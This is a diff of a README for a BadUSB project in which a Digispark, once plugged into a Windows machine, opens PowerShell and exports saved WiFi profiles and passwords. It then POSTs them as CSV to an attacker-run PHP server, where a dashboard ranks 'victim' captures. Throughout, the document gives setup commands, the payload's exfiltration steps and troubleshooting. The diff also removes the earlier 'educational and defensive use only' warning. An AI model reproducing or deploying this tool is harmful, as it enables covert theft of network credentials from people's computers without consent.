@@ -2,9 +2,7 @@
 
 A BadUSB payload that grabs WiFi credentials from Windows machines and displays them on a web dashboard.
 
-> ⚠️ For educational and defensive security use only. Do not run this on machines or networks you do not own or have explicit permission to test.
-
-![Dashboard Preview](assets/dashboard_overview.png)
+![Dashboard Overview](assets/dashboard_overview.png)
 
 ---
 
@@ -14,67 +12,55 @@ A BadUSB payload that grabs WiFi credentials from Windows machines and displays 
 - Runs PowerShell to extract saved WiFi passwords.
 - Sends everything to a PHP server on Kali or Windows.
 - Shows the captured data in a web dashboard with:
-  - Session-based **login** protection.
-  - **Unique** capture counting (Victim ID + SSID + Password).
-  - Basic **ranking system** and password strength checks.
+  - Session-based login.
+  - Unique capture counting (Victim ID + SSID + Password).
+  - Ranking system and password strength stats.
 
 ---
 
 ## Dashboard Features
 
-- **Login protection**
+![Login Page](assets/login.png)
 
-  The dashboard is protected by a simple session-based login.
-
-  Default credentials are defined at the top of `index.php`:
+- Login protection using a simple session-based login in `index.php`:
 
   ```php
   $VALID_USER = 'admin';
   $VALID_PASS = 'secret123';
   ```
 
-  Change these before using it seriously.
+  Change these values to your own username and password.
 
-- **Duplicate filtering**
+- Unique capture logic:
+  - Duplicate entries with the same **Victim ID + SSID + Password** are ignored.
+  - Stats and ranking only use unique captures.
 
-  The dashboard only counts and displays unique captures based on:
-
-  - Victim ID  
-  - SSID  
-  - Password  
-
-  Any repeated capture with the same Victim ID + SSID + Password is ignored for stats and ranking.
-
-- **Ranking**
-
-  Your “rank” increases as you collect more unique captures:
-
+- Ranking system:
   - Rookie: 0–10 unique captures  
   - Intermediate: 11–30 unique captures  
   - Advanced: 31–100 unique captures  
   - Expert: 100+ unique captures  
 
-  A progress bar shows how far you are inside your current tier.
-
-- **Password stats**
-
-  - Total captures (unique).  
-  - Weak password percentage (short / only letters / only digits).  
-  - Average password length.  
+- Password stats:
+  - Total unique captures.
+  - Weak password percentage.
+  - Average password length.
   - Unique SSIDs and source IPs.
 
-- **CSV tools and filters**
+- CSV & filters:
 
-  - Export all captures to CSV.  
-  - Import captures from CSV.  
-  - Filter by Victim ID, SSID, IP, or OS.  
+  ![Filters Example](assets/filters.png)
+
+  - Filter by Victim ID, SSID, IP, or OS.
+  - Export captures to CSV.
+  - Import captures from CSV.
   - Delete single entries or clear all history.
 
 ---
 
 ## Setting Up the Server
 
-You can host the dashboard on either Kali or Windows. Pick whichever you’re more comfortable with.
+You can host the dashboard on either Kali or Windows.
 
 ### On Kali Linux
 
@@ -105,24 +91,22 @@ sudo chown www-data:www-data /var/www/html/{index.php,wifi-recv.php,wifi_creds.l
 sudo chmod 664 /var/www/html/wifi_creds.log
 ```
 
-Make sure it works:
+Test the receiver:
 
 ```bash
 curl -X POST http://localhost/wifi-recv.php -d "data=test"
 cat /var/www/html/wifi_creds.log
 ```
 
-If you see `data=test` in the output, the server is working.
+If you see `data=test`, the server is working.
 
-Open in a browser:
+Open the dashboard:
 
 ```text
 http://YOUR_IP/index.php
 ```
 
-Replace `YOUR_IP` with the IP address of your Kali machine.
-
-You should see the login page first. Use the configured username and password to enter the dashboard.
+Replace `YOUR_IP` with your Kali machine IP, log in, and you should see the dashboard.
 
 ---
 
@@ -161,20 +145,20 @@ ipconfig
 
 Look for the IPv4 address on your active adapter.
 
-Test it:
+Test the receiver:
 
 ```powershell
 Invoke-WebRequest -Uri 'http://localhost/wifi-recv.php' -Method POST -Body "data=test"
 Get-Content C:\xampp\htdocs\wifi_creds.log
 ```
 
-Open in a browser:
+Open the dashboard:
 
 ```text
 http://localhost/index.php
 ```
 
-Log in with your configured credentials to view the dashboard.
+Log in with your credentials.
 
 ---
 
@@ -210,16 +194,16 @@ payloads/wifi_stealer_digispark.ino
 $u='http://YOUR_IP/wifi-recv.php';
 ```
 
-Replace `YOUR_IP` with the IP of your Kali or Windows server (for example `http://192.168.1.10/wifi-recv.php` on your LAN).
+Replace `YOUR_IP` with the IP of your Kali or Windows server.
 
-3. Make sure the payload sends **raw CSV** to `wifi-recv.php` in this format:
+3. The payload should:
 
-- Export Wi‑Fi profiles to `%TEMP%` using `netsh wlan export profile`.
-- Parse each `Wi-Fi-*.xml` file to build objects with properties:  
+- Export Wi‑Fi profiles using `netsh wlan export profile` to `%TEMP%`.
+- Parse each `Wi-Fi-*.xml` file and build objects with fields:  
   `Time, VictimID, SSID, Pass, VictimLANIP, OS, PublicIP, LANextra, Lat, Lon, PacketSummary`.
-- Export these objects as CSV to something like `%TEMP%\w.csv`.
-- Use `Invoke-WebRequest` to POST the contents of that CSV as the body to `http://YOUR_IP/wifi-recv.php`.
-- Delete the XML and CSV files and exit PowerShell when done.
+- Export these objects as CSV to `%TEMP%\w.csv`.
+- Use `Invoke-WebRequest` to POST the CSV contents to `http://YOUR_IP/wifi-recv.php`.
+- Delete XML and CSV temp files and exit PowerShell.
 
 4. Click **Upload** in Arduino IDE.
 5. When Arduino IDE says `Plug in device now...`, plug in the Digispark.
@@ -228,10 +212,9 @@ Replace `YOUR_IP` with the IP of your Kali or Windows server (for example `http:
 After flashing, plugging the Digispark into a Windows machine will:
 
 - Open PowerShell.
-- Read saved WiFi profiles and extract the passwords.
-- Send the captured data to your PHP receiver as CSV.
-- Clean up the temp files it created.
-- Optionally blink the onboard LED to signal it’s done.
+- Extract saved WiFi profiles and passwords.
+- POST the CSV data to your PHP receiver.
+- Clean up temp files.
 
 ---
 
@@ -249,21 +232,19 @@ The dashboard is available at:
 http://YOUR_IP/index.php
 ```
 
-After login, the dashboard shows:
+The dashboard shows:
 
-- Total number of **unique** captures.
+- Total number of unique captures.
 - SSIDs and passwords.
 - Victim ID and IP address.
 - OS information.
-- Weak vs ok password status.
+- Weak / ok password status.
 - Rank and progress bar.
-- Actions to delete a single entry or clear all history.
+- Delete single entries or clear all history.
 
 ---
 
 ## Removing the Project
-
-If you want to remove everything, delete the files you copied earlier.
 
 ### On Kali Linux
 
@@ -273,7 +254,7 @@ sudo rm -f /var/www/html/wifi-recv.php
 sudo rm -f /var/www/html/wifi_creds.log
 ```
 
-If you want to remove the whole repository too:
+If you want to remove the repo too:
 
 ```bash
 rm -rf ~/wifi-stealer
@@ -289,7 +270,7 @@ wifi-recv.php
 wifi_creds.log
 ```
 
-If you cloned the repo, you can also delete the project folder you downloaded.
+If you cloned the repo, you can also delete the project folder.
 
 ---
 
@@ -297,108 +278,56 @@ If you cloned the repo, you can also delete the project folder you downloaded.
 
 ### Dashboard loads, but no data appears
 
-Most of the time the server is fine and the issue is on the Windows / payload side.
+1. Test the PHP receiver from the server:
 
-**1. Check the receiver and log file**
+   ```bash
+   curl -X POST http://localhost/wifi-recv.php -d "data=test"
+   cat /var/www/html/wifi_creds.log
+   ```
 
-- Test the PHP receiver from the server itself:
-
-  ```bash
-  curl -X POST http://localhost/wifi-recv.php -d "data=test"
-  cat /var/www/html/wifi_creds.log
-  ```
-
-- If nothing is written:
-  - Make sure Apache is running:  
-    `sudo systemctl status apache2`
-  - Check the log file exists and is writable:  
-    `ls -l /var/www/html/wifi_creds.log` and fix ownership/permissions as in the setup section.
-
----
+2. If nothing is written:
+   - Check Apache status.  
+   - Check `wifi_creds.log` exists and is writable.
 
 ### PowerShell error: “Unable to connect to the remote server”
 
-This means Windows can’t reach your server at the URL you used in `Invoke-WebRequest`.
-
-On the Windows machine, in PowerShell:
+From the Windows target:
 
 ```powershell
-# 1) Can we reach the server IP?
 ping YOUR_IP
-
-# 2) Is the HTTP port open?
 Test-NetConnection YOUR_IP -Port 80
-# or, if you really configured Apache on a custom port:
-Test-NetConnection YOUR_IP -Port 8080
 ```
 
-Also double‑check the URL:
+Fix the URL in the payload if needed and reflash the Digispark.
 
-- Default Apache from this README uses:  
-  `http://YOUR_IP/wifi-recv.php`
-- Only use `:8080` if you configured Apache to listen on 8080 and tested it in a browser first.
+### CSV looks good on Windows, but dashboard is empty
 
-If manual tests work, make sure the **same URL** is used in your Digispark sketch wherever you define `$u`.
-
-Reflash the Digispark after any IP/URL change.
-
----
-
-### PowerShell error: “You cannot call a method on a null-valued expression”
-
-This usually comes from the WiFi profile parsing line when a split doesn’t match some `netsh` output lines, so you end up calling a property or method on `$null`.
-
-Use the safer approach:
-
-```powershell
-$profiles = (netsh wlan show profiles) |
-  Select-String "All User Profile" |
-  ForEach-Object {
-    $_.Line.Split(':').Trim()
-  }
-```
-
-Run the WiFi extraction commands step‑by‑step in a PowerShell window on your test machine, fix them there, then mirror the working commands into the Digispark sketch.
-
----
-
-### CSV looks good on Windows, but dashboard is still empty
-
-If `Get-Content` of your CSV on Windows shows valid data, but nothing appears in the dashboard:
-
-- Manually POST the CSV from PowerShell:
+- Manually POST the CSV:
 
   ```powershell
   $b = Get-Content $csvPath -Raw
   Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b
   ```
 
-- On the server, watch the log in real time:
+- Watch the log on the server:
 
   ```bash
   sudo tail -f /var/www/html/wifi_creds.log
   ```
 
-If this manual POST writes to the log, the PHP side is fine. Then the issue is:
+If manual POST works, the issue is usually the hard-coded URL in the sketch or timing/keystroke problems.
 
-- Wrong IP/URL hard‑coded in the Digispark sketch, or
-- HID keystrokes being dropped because the Digispark is typing too fast.
+### Digispark upload issues
 
----
-
-### Digispark upload fails or acts weird
-
-- Plug the Digispark in **only after** you click **Upload** in Arduino IDE.
-- Try a different USB port or a short USB extension cable.
-- Confirm `Digispark (Default – 16.5 MHz)` is selected under **Tools → Board**.
-- Make sure there is only one `.ino` in the sketch folder.
-- Ensure `#include "DigiKeyboard.h"` is at the top of the file.
+- Plug it in only after clicking **Upload**.
+- Try a different USB port.
+- Board set to `Digispark (Default – 16.5 MHz)`.
+- Only one `.ino` in the sketch folder.
+- `#include "DigiKeyboard.h"` at the top.
 
 ---
 
-## Notes / Future ideas
+## Notes
 
-- Better logging and timestamps.
-- Per‑victim history and more detailed stats.
-- Stronger authentication (hashed passwords).
-- HTTPS for the dashboard.
+- Edit login credentials in `index.php` (`$VALID_USER`, `$VALID_PASS`).
+- Ranking thresholds and labels can be tweaked in the rank calculation section of `index.php`.
